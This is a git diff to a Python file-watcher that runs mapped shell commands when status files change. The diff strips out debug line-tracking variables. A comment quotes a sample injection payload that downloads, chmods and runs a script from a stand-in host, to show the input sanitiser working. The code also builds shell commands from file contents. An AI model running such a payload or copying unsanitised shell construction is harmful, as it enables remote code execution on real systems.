@@ -169,68 +169,48 @@ def start_watchdog(logger):
                 ignore_directories=True,
             )
             self.lock = []
-            self.line = 0
 
         def on_modified(self, event):
             global commands
-            self.line = 0
             if os.path.normpath(event.src_path) not in self.lock:
                 self.lock.append(os.path.normpath(event.src_path))
                 try:
-                    self.line = 1
                     logger.info(f"New event on {event.src_path}")
-                    self.line = 2
                     cmdname = os.path.split(event.src_path)[-1]
-                    self.line = 3
                     logger.info(f"Previously: {commands[cmdname]['last_val']}")
-                    self.line = 4
                     with open(event.src_path, "r") as f:
-                        self.line = 4
                         val = (
                             f.readline().strip("\n").rstrip()
                         )  # this assumes only one line will be written to this file
-                        self.line = 5
                         logger.info("written val: " + val)
-                        self.line = 6
                         if val == commands[cmdname]["last_val"]:  # do nothing
-                            self.line = 7
                             logger.info(f"No change detected, not doing anything")
                             # execcmd(
                             #    f"echo 'no change detected' > {os.path.join(STATUSDIR,cmdname+'-response')}"
                             # )
-                            self.line = 8
                             self.lock.remove(os.path.normpath(event.src_path))
                             return
                         elif not commands[cmdname]["change-to"] == "any":
-                            self.line = 9
                             print("Change-to is not any")
-                            self.line = 10
                             if not val == commands[cmdname]["change-to"]:
-                                self.line = 11
                                 print(commands[cmdname]["last_val"])
                                 print(os.path.join(STATUSDIR, cmdname))
                                 print("val is not change-to")
-                                self.line = 12
                                 logger.info(
                                     f'Invalid value written to {os.path.join(STATUSDIR,cmdname)}: {val}, reverting to {commands[cmdname]["last_val"]}'
                                 )
-                                self.line = 13
                                 execcmd(
                                     f'echo "{commands[cmdname]["last_val"]}">{os.path.join(STATUSDIR,cmdname)} '
                                 )
-                                self.line = 14
                                 self.lock.remove(os.path.normpath(event.src_path))
                                 return
                             else:
-                                self.line = 15
                                 print("else")
                                 logger.info(
                                     f'Valid value written to {os.path.join(STATUSDIR,cmdname)}: {val}, executing {commands[cmdname]["cmd"]}'
                                 )
-                                self.line = 16
                                 response = execcmd(commands[cmdname]["cmd"])
                         else:  # val change-to is any then
-                            self.line = 17
                             # sanitize user input before executing it in bash
                             # goal: allow only alphanumeric and spaces, and convert spaces to underscores
                             clean = str(val).replace("_", "")
@@ -241,52 +221,38 @@ def start_watchdog(logger):
                             # ";$(wget example.com/malicious_script.sh; chmod +777 malicious_script.sh; ./malicious_script.sh)"->
                             # '"wget_examplecommaliciousscriptsh_chmod_777_maliciousscriptsh_maliciousscriptsh"'
                             command = commands[cmdname]["cmd"].replace("$any$", clean)
-                            self.line = 18
                             logger.info(
                                 f"'{val}'  written to {os.path.join(STATUSDIR,cmdname)}, executing {command}"
                             )
-                            self.line = 19
                             response = execcmd(command)
-                        self.line = 20
                         [logger.info(f"Response: {r}") for r in response]
-                        self.line = 21
                         if not commands[cmdname]["response"]:
-                            self.line = 22
                             index = int(commands[cmdname]["response-index"])
                             if index >= len(response) or index <= -len(response):
                                 index = -1
                             print_response = response[index]
                         else:
-                            self.line = 23
                             print_response = execcmd(commands[cmdname]["response"])[0]
-                        self.line = 24
                         execcmd(
                             f'echo "{print_response}">{os.path.join(STATUSDIR,cmdname+"-response")}'
                         )
-                        self.line = 25
                         logger.info(
                             f"'{print_response}' written to {os.path.join(STATUSDIR,cmdname+'-response')}"
                         )
-                        self.line = 26
                         # write back default to last val and to file
                         default = execcmd(commands[cmdname]["default"])[0]
-                        self.line = 27
                         commands[cmdname][
                             "last_val"
                         ] = default  # update last_val before writing file because it will trigger a new event
-                        self.line = 28
                         logger.info(f"{default=}")
                         echoline = (
                             f'echo "{default}">{os.path.join(STATUSDIR, cmdname)}'
                         )
-                        self.line = 28.5
                         logger.info(f"{echoline=}")
                         execcmd(echoline)
-                        self.line = 29
                         logger.info(f"new val:{commands[cmdname]['last_val']}")
                 except:
-                    logger.critical(f"process crashed on {self.line=} managing {event}")
-
+                    logger.critical(f"process crashed managing {event}")
                 self.lock.remove(os.path.normpath(event.src_path))
             else:
                 logger.info(
